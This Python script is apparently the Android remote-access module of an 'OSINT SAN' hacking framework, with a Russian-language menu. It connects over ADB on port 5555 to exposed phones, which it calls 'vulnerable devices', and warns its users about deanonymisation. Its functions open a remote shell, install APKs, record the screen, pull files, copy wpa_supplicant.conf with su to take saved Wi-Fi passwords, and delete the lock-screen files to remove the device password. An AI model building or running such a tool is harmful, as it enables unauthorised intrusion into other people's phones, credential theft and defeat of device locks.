#!/usr/bin/python
#-*- coding: utf-8 -*-
#Developer by Bafomet
import os
import sys
# import readline
import random
import time as t
import subprocess


# def autocomplete(text, state):
#     line = readline.get_line_buffer()
#     splitted = line.lstrip().split(" ")
# 
#     # no space, autocomplete will be the basic commands:
#     options = [x + " " for x in actions if x.startswith(text)]
#     options.extend([x + " " for x in remap if x.startswith(text)])
#     try:
#         return options[state]
#     except:
#         return None
# 
# 
# def get_input(prompt, auto_complete_fn=None, basefile_fn=None):
#     try:
#         if auto_complete_fn != None:
#             import readline
#             readline.set_completer_delims(' \t\n;/')
#             readline.parse_and_bind("tab: complete")
#             readline.set_completer(auto_complete_fn)
#     except Exception as e:
#         pass
# 
#     cmd = input("%s" % prompt)
#     return cmd.strip()


CurrentDir = os.path.dirname(os.path.abspath(__file__))
# readline.set_completer(autocomplete)
# readline.parse_and_bind("tab: complete")
WHSL = '\033[1;32m'
ENDL = '\033[0m'
REDL = '\033[0;31m'
GNSL = '\033[1;34m'

arrow = f" {REDL}└──>{WHSL}"
connect = f"{REDL}│{WHSL}"
os.system('clear')  

page_1 = '''{0}
 {1}{0}[{2} Official channel {0}tg {1}@osint_san_framework {1}{0}]            {0}[{2} GitHub {1}https://github.com/Bafomet666 {1}{0}]
                      ______                   __                      __        __         ______    ______   __    __ 
                     /      \                 /  |                    /  |      /  |       /      \  /      \ /  \  /  |
                    /$$$$$$  | _______    ____$$ |  ______    ______  $$/   ____$$ |      /$$$$$$  |/$$$$$$  |$$  \ $$ |
                    $$ |__$$ |/       \  /    $$ | /      \  /      \ /  | /    $$ |      $$ \__$$/ $$ |__$$ |$$$  \$$ |
                    $$    $$ |$$$$$$$  |/$$$$$$$ |/$$$$$$  |/$$$$$$  |$$ |/$$$$$$$ |      $$      \ $$    $$ |$$$$  $$ |
                    $$$$$$$$ |$$ |  $$ |$$ |  $$ |$$ |  $$/ $$ |  $$ |$$ |$$ |  $$ |       $$$$$$  |$$$$$$$$ |$$ $$ $$ |
                    $$ |  $$ |$$ |  $$ |$$ \__$$ |$$ |      $$ \__$$ |$$ |$$ \__$$ |      /  \__$$ |$$ |  $$ |$$ |$$$$ |
                    $$ |  $$ |$$ |  $$ |$$    $$ |$$ |      $$    $$/ $$ |$$    $$ |      $$    $$/ $$ |  $$ |$$ | $$$ |
                    $$/   $$/ $$/   $$/  $$$$$$$/ $$/        $$$$$$/  $$/  $$$$$$$/        $$$$$$/  $$/   $$/ $$/   $$/ 
                                                                                                                                                                                                                                                                                                                                                                                                                                          
 {2}Framework :{2}{0} OSINT SAN.{0}
 {2}Update{0} RED Alert v-3.0
              
 {1}[ {0}1{1} ] {2} Показать подключенные устройства        {1}[ {0}10{1} ] {2} Выключите устройство        {1}[ {0}19{1} ] {2} Извлечь apk из приложения            
 {1}[ {0}2{1} ] {2} Отключить все устройства                {1}[ {0}11{1} ] {2} Удалить приложение          {1}[ {0}20{1} ] {2} Get Battery Status                
 {1}[ {0}3{1} ] {2} Подключите новое устройство             {1}[ {0}12{1} ] {2} Показать журнал устройства  {1}[ {0}21{1} ] {2} Get Network Status                
 {1}[ {0}4{1} ] {2} Доступ через shell                      {1}[ {0}13{1} ] {2} Dump System Info            {1}[ {0}22{1} ] {2} Включение / выключение Wi-Fi      
 {1}[ {0}5{1} ] {2} Установите apk на устройство            {1}[ {0}14{1} ] {2} Список всех приложений      {1}[ {0}23{1} ] {2} Удалить пароль устройства        
 {1}[ {0}6{1} ] {2} Screen record a device                  {1}[ {0}15{1} ] {2} Запустить приложение        {1}[ {0}24{1} ] {2} Эмуляция нажатия кнопок           
 {1}[ {0}7{1} ] {2} Get device screenshot                   {1}[ {0}16{1} ] {2} Port Forwarding             {1}[ {0}25{1} ] {2} Получить текущую активность       
 {1}[ {0}8{1} ] {2} Перезапустите Satana Sploit             {1}[ {0}17{1} ] {2} Grab wpa_supplicant                      
 {1}[ {0}9{1} ] {2} Извлечь файлы с устройства              {1}[ {0}18{1} ] {2} Show Mac/Inet                
  
 {1}[ {0}99{1} ] {2} Выйти и отключить adb server
'''.format(GNSL, REDL, WHSL)


def android_debug():
    os.system("printf '\033]2;Android Remote Access. OSINT SAN\a'")
    print()
    print("{1} [ {0}+{1} ]{2} Запуск ADB сервера...".format(REDL, GNSL, WHSL))
    print()
    print("{1} [ {0}+{1} ]{2} Подожди 7 секунд до открытия меню.".format(REDL, GNSL, WHSL))
    print()
    g = os.environ['HOME'] + '/Satana ADB'
    os.system("adb tcpip 5555 >> /dev/null")
    t.sleep(4)
    os.system('clear')
    print(page_1)

    device_name = None
    while True:
        print(
            "\n{1} [ {0}+{1} ]{2} Твоя база данных, уязвимых устройств. Последние подключения.".format(
                REDL, GNSL, WHSL))
        print()
        print(
            " Важно выходить через кнопку R, если вы просто выйдете из инструмента и отключите vpn, ADB сервер будет включен,")
        print(" и все подключения буду активны, это приведет к вашей деанонимизации.")
        print()
        os.system("adb devices -l")
        os.system("adb tcpip 5555")
        print()

        option = input(
            f"{REDL} └──>{ENDL} Android Debug Bridge {GNSL}[{REDL} main_menu {GNSL}]{ENDL} : "
        )

        if option == '1':
            if not device_name:
                print("{1}[{0}+{1}]{2} └──> Нет подключенных устройств.".format(REDL, GNSL, WHSL))
            else:
                os.system("adb devices -l")

        elif option == '2':
            if not device_name:
                print("{1}[{0}+{1}]{2} Нет подключенных устройств.".format(REDL, GNSL, WHSL))
            else:
                os.system("adb disconnect")

        elif option == '3':
            print("\n{1}[{0}+{1}]{2} Введите IP address.".format(REDL, GNSL, WHSL))
            try:
                device_name = input(f"{arrow}Android Debug Bridge{GNSL}({REDL}connect_device{GNSL}){ENDL}> ")
            except KeyboardInterrupt:
                continue
            if device_name == '':
                continue
            if device_name == '27':
                continue
                
            os.system(f"adb connect {device_name}:5555")

        elif option == '4':
            if not device_name:
                print("{1}[{0}+{1}]{2} Нет подключенных устройств.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell")

        elif option == '5':
            if not device_name:
                print("{1}[{0}+{1}]{2} Нет подключенных устройств.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("    {1}[{0}+{1}]{2} Введите локацию apk.  Пример /home/salita/Desktop/test.apk.".format(REDL, GNSL, WHSL))
                apk_location = input(f"    {arrow} Android Debug Bridge{GNSL}({REDL}apk_install{GNSL}){ENDL}> ")
               
                w = os.environ['OLDPWD']
                os.chdir(w)
    
                os.system("adb -s  "+device_name+" install "+apk_location)
                
                os.chdir(g)
    
                print(f"{GNSL}Apk был установлен.")

        elif option == '6':
            if not device_name:
                print("{1}[{0}+{1}]{2} Нет подключенных устройств.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("    {1}[{0}+{1}]{2} Запись видео началась.".format(REDL, GNSL, WHSL))
                print(f"     {connect}")
                os.system(f"adb -s {device_name} shell screenrecord /sdcard/screen.mp4")
                print("    {1}[{0}+{1}]{2} Укажите, где вы хотите сохранить видео.".format(REDL, GNSL, WHSL))
                place_location = input(f"    {arrow} Android Debug Bridge{GNSL}({REDL}screen_record{GNSL}){ENDL}> ")
                
                w = os.environ['OLDPWD']
                os.chdir(w)
    
                os.system(f"adb -s {device_name} pull /sdcard/screen.mp4 {place_location}")
                
                os.chdir(g)

        elif option == '7':
            if not device_name:
                print("{1}[{0}+{1}]{2} Нет подключенных устройств.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell screencap /sdcard/screen.png")
                print(f"     {connect}")
                print("    {1}[{0}+{1}]{2} Введите, где вы хотите сохранить снимок экрана.".format(REDL, GNSL, WHSL))
                place_location = input(f"    {arrow}Android Debug Bridge{GNSL}({REDL}screenshot{GNSL}){ENDL}> ")
    
                w = os.environ['OLDPWD']
                os.chdir(w)
    
                os.system(f"adb -s {device_name} pull /sdcard/screen.png {place_location}")
                
                os.chdir(g)

        elif option == '8':
            print("{1}[{0}+{1}]{2} Restarting Server...{3}".format(REDL, GNSL, WHSL, ENDL))
            os.system("adb disconnect >> /dev/null")
            os.system("adb kill-server >> /dev/null")
            os.system("adb start-server >> /dev/null")
            t.sleep(4)

        elif option == '9':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства еще не подключены..".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("    {1}[{0}+{1}]{2} Введите местоположение файла на устройстве.".format(REDL, GNSL, WHSL))
                file_location = input(f"    {arrow}Android Debug Bridge{GNSL}({REDL}file_pull{GNSL}){ENDL}> ")
                print(f"        {connect}")
                print("       {1}[{0}+{1}]{2} Введите, где вы хотите сохранить файл.".format(REDL, GNSL, WHSL))
                place_location = input(f"       {arrow} Android Debug Bridge{GNSL}({REDL}file_pull{GNSL}){ENDL}> ")
                
                w = os.environ['OLDPWD']
                os.chdir(w)
    
                os.system(f"adb -s {device_name} pull {file_location} {place_location}")
     
                os.chdir(g)

        elif option == '10':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} reboot ")

        elif option == '11':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("    {1}[{0}+{1}]{2} Enter a package name.".format(REDL, GNSL, WHSL))
                package_name = input(f"    {arrow} Android Debug Bridge{GNSL}({REDL}app_delete{GNSL}){ENDL}> ")
                os.system(f"adb -s {device_name} unistall package_name")

        elif option == '12':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f'adb -s {device_name} logcat ')

        elif option == '13':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell dumpsys")

        elif option == '14':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
                main()
            os.system(f"adb -s {device_name} shell pm list packages -f")

        elif option == '15':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
                main()
            print(f"     {connect}")
            print("    {1}[{0}+{1}]{2} Enter a package name.".format(REDL, GNSL, WHSL))
            package_name = input(f"    {arrow} Android Debug Bridge{GNSL}({REDL}app_run{GNSL}){ENDL}> ")
            os.system(f"adb -s {device_name} shell monkey -p "+package_name+" -v 500")

        elif option == '16':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("    {1}[{0}+{1}]{2} Введите порт на устройстве.".format(REDL, GNSL, WHSL))
                port_device = input("    "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "port_forward" + GNSL + ")"+ENDL + "> ")
                print(f"         {connect}")
                print("        {1}[{0}+{1}]{2} Enter a port to forward it too.".format(REDL, GNSL, WHSL))
                forward_port = input("        "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "port_forward" + GNSL + ")"+ENDL + "> ")
                os.system(f"adb -s {device_name} forward tcp:"+port_device+" tcp:"+forward_port)

        elif option == '17':
            try:
                print(f"     {connect}")
                print("    {1}[{0}+{1}]{2} Введите, где вы хотите сохранить файл.".format(REDL, GNSL, WHSL))
                location = input(f"    {arrow} Android Debug Bridge{GNSL}({REDL}wpa_grub{GNSL}){ENDL}> ")
                
                w = os.environ['OLDPWD']
                os.chdir(w)

                os.system(f"adb -s {device_name} shell su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
                os.system(f"adb -s {device_name} pull /sdcard/wpa_supplicant.conf {location}")

                os.chdir(g)

            except KeyboardInterrupt:
                if not device_name:
                    print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))

        elif option == '18':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell ip address show wlan0")

        elif option == '19':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
                main()
            print(f"     {connect}")
            print("    {1}[{0}+{1}]{2} Enter a package name.".format(REDL, GNSL, WHSL))
            package_name = input("    "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "pull_apk" + GNSL + ")"+ENDL + "> ")
            os.system(f"adb -s {device_name} shell pm path "+package_name)
            print(f"         {connect}")
            print("        {1}[{0}+{1}]{2} Введите путь к apk.".format(REDL, GNSL, WHSL))
            path = input("        "+arrow + " Android Debug Bridge"+GNSL+"("+REDL + "pull_apk" + GNSL + ")"+ENDL + "> ")
            print(f"             {connect}")
            print("            {1}[{0}+{1}]{2} Введите место хранения apk.".format(REDL, GNSL, WHSL))
            location = input(f"            {arrow} Android Debug Bridge{GNSL}({REDL}pull_apk{GNSL}){ENDL}> ")
       
            w = os.environ['OLDPWD']
            os.chdir(w)

            os.system(f"adb -s {device_name} pull {path} {location}")
            
            os.chdir(g)

        elif option == '20':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell dumpsys battery")

        elif option == '21':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell netstat")

        elif option == '22':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print("    {1}[{0}+{1}]{2} Чтобы снова включить WiFi, устройство должно быть подключено.".format(REDL, GNSL, WHSL))
                print(f"     {connect}")
                on_off = input(f"{GNSL}    [{REDL}+{GNSL}]{WHSL} Хотите включить/выключить WiFi on/off")
                if on_off == 'off':
                    command = " shell svc wifi disable"
                else:
                    command = " shell svc wifi enable"

                os.system(f"adb -s {device_name} {command}")

        elif option == '23':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
            else:
                print(f"     {connect}")
                print(REDL + "****************** REMOVING PASSWORD ******************")
                os.system(f"adb -s {device_name} shell su 0 'rm /data/system/gesture.key'")
                os.system(f"adb -s {device_name} shell su 0 'rm /data/system/locksettings.db'")
                os.system(f"adb -s {device_name} shell su 0 'rm /data/system/locksettings.db-wal'")
                os.system(f"adb -s {device_name} shell su 0 'rm /data/system/locksettings.db-shm'")
                print(REDL + "****************** REMOVING PASSWORD ******************")

        elif option == '24':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства не подключены.".format(REDL, GNSL, WHSL))
                main()
            print('''
 0   -->  KEYCODE_UNKNOWN
 1   -->  KEYCODE_MENU
 2   -->  KEYCODE_SOFT_RIGHT
 3   -->  KEYCODE_HOME
 4   -->  KEYCODE_BACK
 5   -->  KEYCODE_CALL
 6   -->  KEYCODE_ENDCALL
 7   -->  KEYCODE_0
 8   -->  KEYCODE_1
 9   -->  KEYCODE_2
 10  -->  KEYCODE_3
 11  -->  KEYCODE_4
 12  -->  KEYCODE_5
 13  -->  KEYCODE_6
 14  -->  KEYCODE_7
 15  -->  KEYCODE_8
 16  -->  KEYCODE_9
 17  -->  KEYCODE_STAR
 18  -->  KEYCODE_POUND
 19  -->  KEYCODE_DPAD_UP
 20  -->  KEYCODE_DPAD_DOWN
 21  -->  KEYCODE_DPAD_LEFT
 22  -->  KEYCODE_DPAD_RIGHT
 23  -->  KEYCODE_DPAD_CENTER
 24  -->  KEYCODE_VOLUME_UP
 25  -->  KEYCODE_VOLUME_DOWN
 26  -->  KEYCODE_POWER
 27  -->  KEYCODE_CAMERA
 28  -->  KEYCODE_CLEAR
 29  -->  KEYCODE_A
 30  -->  KEYCODE_B
 31  -->  KEYCODE_C
 32  -->  KEYCODE_D
 33  -->  KEYCODE_E
 34  -->  KEYCODE_F
 35  -->  KEYCODE_G
 36  -->  KEYCODE_H
 37  -->  KEYCODE_I
 38  -->  KEYCODE_J
 39  -->  KEYCODE_K
 40  -->  KEYCODE_L
 41  -->  KEYCODE_M
 42  -->  KEYCODE_N
 43  -->  KEYCODE_O
 44  -->  KEYCODE_P
 45  -->  KEYCODE_Q
 46  -->  KEYCODE_R
 47  -->  KEYCODE_S
 48  -->  KEYCODE_T
 49  -->  KEYCODE_U
 50  -->  KEYCODE_V
 51  -->  KEYCODE_W
 52  -->  KEYCODE_X
 53  -->  KEYCODE_Y
 54  -->  KEYCODE_Z
 55  -->  KEYCODE_COMMA
 56  -->  KEYCODE_PERIOD
 57  -->  KEYCODE_ALT_LEFT
 58  -->  KEYCODE_ALT_RIGHT
 59  -->  KEYCODE_SHIFT_LEFT
 60  -->  KEYCODE_SHIFT_RIGHT
 61  -->  KEYCODE_TAB
 62  -->  KEYCODE_SPACE
 63  -->  KEYCODE_SYM
 64  -->  KEYCODE_EXPLORER
 65  -->  KEYCODE_ENVELOPE
 66  -->  KEYCODE_ENTER
 67  -->  KEYCODE_DEL
 68  -->  KEYCODE_GRAVE
 69  -->  KEYCODE_MINUS
 70  -->  KEYCODE_EQUALS
 71  -->  KEYCODE_LEFT_BRACKET
 72  -->  KEYCODE_RIGHT_BRACKET
 73  -->  KEYCODE_BACKSLASH
 74  -->  KEYCODE_SEMICOLON
 75  -->  KEYCODE_APOSTROPHE
 76  -->  KEYCODE_SLASH
 77  -->  KEYCODE_AT
 78  -->  KEYCODE_NUM
 79  -->  KEYCODE_HEADSETHOOK
 80  -->  KEYCODE_FOCUS
 81  -->  KEYCODE_PLUS
 82  -->  KEYCODE_MENU
 83  -->  KEYCODE_NOTIFICATION
 84  -->  KEYCODE_SEARCH
 85  -->  TAG_LAST_KEYCODE
            ''')
            print("{1}[{0}+{1}]{2} Введите номер опции.".format(REDL, GNSL, WHSL))
            num = input(f"{arrow} Android Debug Bridge{GNSL}({REDL}keycode{GNSL}){ENDL}> ")
            os.system(f"adb -s {device_name} shell input keyevent {num}")

        elif option == '25':
            if not device_name:
                print("{1}[{0}+{1}]{2} Устройства еще не подключены.".format(REDL, GNSL, WHSL))
            else:
                os.system(f"adb -s {device_name} shell dumpsys activity")

        elif option == '99':
            print()
            print("{1} [{0} + {1}]{2} Отключение сервера и выход в OSINT SAN...{3}".format(REDL, GNSL, WHSL, ENDL))
            os.system("adb disconnect >> /dev/null")
            os.system("adb kill-server >> /dev/null")
            from osintsan import menu
            menu()
            os.system("printf '\033]2;OSINT SAN 3.5\a'")
            break
            
        else:
            print("Android Debug Bridge: Ошибка: invalid command")

